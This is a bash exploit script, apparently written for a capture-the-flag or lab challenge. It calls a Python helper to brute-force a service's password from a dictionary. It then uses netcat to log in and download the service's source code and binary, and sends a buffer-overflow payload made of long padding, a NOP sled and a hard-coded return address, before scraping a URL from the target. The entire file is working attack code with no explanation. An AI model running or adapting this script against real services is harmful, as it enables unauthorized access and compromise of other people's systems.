#!/usr/bin/env bash

USAGE="Usage: command <target-ip> <skeletonkey> <user> <dictionary>"
if [ $# -ne 4 ]; then
    echo $USAGE
    exit 1;
fi

TARGET=$1
SKELETONKEY=$2
USER=$3
DICT=$4
SSTR="source"
BSTR="binary"
SOURCE="source/source.c"
BINARY="source/binary"
PASS="pass.txt"
COMMANDS="source/commands.txt"
COMMANDB="source/commandb.txt"
STR=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
SLED='\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90'
ADDR='\x3c\x8e\x04\x08'

python3 -u ./python/auto.py $TARGET $SKELETONKEY $USER $DICT

read -d $'\x04' PORT PASSWORD < "$PASS"

touch $COMMANDS
echo $SKELETONKEY >> $COMMANDS
echo $USER >> $COMMANDS
echo $PASSWORD >> $COMMANDS
echo $SSTR >> $COMMANDS
touch $SOURCE
while read -r line ; do echo "$line"; sleep 0.015; done < "$COMMANDS" | nc $TARGET $PORT > $SOURCE
sed -i '1 s/Username: //' $SOURCE
sed -i '1 s/Password: //' $SOURCE
sed -i '1 s/Command: //'  $SOURCE
rm $COMMANDS

touch $COMMANDB
echo $SKELETONKEY >> $COMMANDB
echo $USER >> $COMMANDB
echo $PASSWORD >> $COMMANDB
echo $BSTR >> $COMMANDB
touch $BINARY
while read -r line ; do echo "$line"; sleep 0.015; done < "$COMMANDB" | nc $TARGET $PORT > $BINARY
sed -i '1 s/Username: //' $BINARY
sed -i '1 s/Password: //' $BINARY
sed -i '1 s/Command: //'  $BINARY
rm $COMMANDB
rm $PASS

echo -ne $STR$SLED$ADDR | nc $TARGET $PORT

wget --quiet -O - $TARGET:$PORT | grep -o 'http://[^"]*' | tr -d "'"
